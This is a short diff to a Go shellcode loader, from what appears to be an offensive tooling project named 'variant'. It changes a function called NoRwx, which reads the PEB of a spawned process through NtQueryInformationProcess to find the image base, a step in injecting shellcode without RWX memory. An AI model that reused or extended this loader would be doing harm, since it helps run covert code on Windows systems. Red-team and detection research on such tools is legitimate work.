@@ -2,7 +2,6 @@ package loader
 
 import (
 	"encoding/binary"
-	"fmt"
 	"unsafe"
 	"variant/log"
 	"variant/wdll"
@@ -35,14 +34,16 @@ func NoRwx(shellcode []byte) {
 		log.Fatal(err)
 	}
 
-	fmt.Println("[*] Calling NtQueryInformationProcess...")
-	wdll.NtQueryInformationProcess().Call(
-		uintptr(pi.Process),
+	_, ntErr := xwindows.NtQueryInformationProcessZ(
+		pi.Process,
 		uintptr(info),
 		uintptr(unsafe.Pointer(&pbi)),
 		unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{}),
 		uintptr(unsafe.Pointer(&returnLength)),
 	)
+	if ntErr != nil {
+		log.Fatalf("NtQueryInformationProcessZ failed: %w", ntErr)
+	}
 
 	pebOffset := uintptr(unsafe.Pointer(pbi.PebBaseAddress)) + 0x10
 	var imageBase uintptr = 0
